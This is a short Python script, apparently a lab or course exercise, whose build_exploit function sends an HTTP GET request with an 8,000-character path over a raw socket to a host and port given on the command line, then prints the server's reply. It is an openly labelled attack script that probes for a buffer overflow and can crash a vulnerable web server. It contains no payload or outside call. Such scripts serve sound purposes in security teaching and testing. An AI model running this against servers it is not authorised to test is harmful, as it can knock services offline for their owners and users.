import sys
import socket
import traceback
import urllib
import urllib.parse
import struct


def build_exploit():

    req = b'GET /' + b''.join([b'a' for i in range(8000)]) + b' HTTP/1.0\r\n'
    return req


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting to %s:%d...' % (host, port))
    sock.connect((host, port))

    print('Connected, sending request...')
    sock.send(req)

    print('Request sent, waiting for reply...')
    rbuf = sock.recv(1024)
    resp = b''
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print('Received reply.')
    sock.close()
    return resp


def main():
    if len(sys.argv) != 3:
        print('Usage:', sys.argv[0], '<host>', '<port>')
        exit()

    try:
        req = build_exploit()
        print('HTTP request:')
        print(req)

        resp = send_req(sys.argv[1], int(sys.argv[2]), req)
        print('HTTP response:')
        print(resp)
    except:
        print('Exception:')
        traceback.print_exc()


if __name__ == '__main__':
    main()
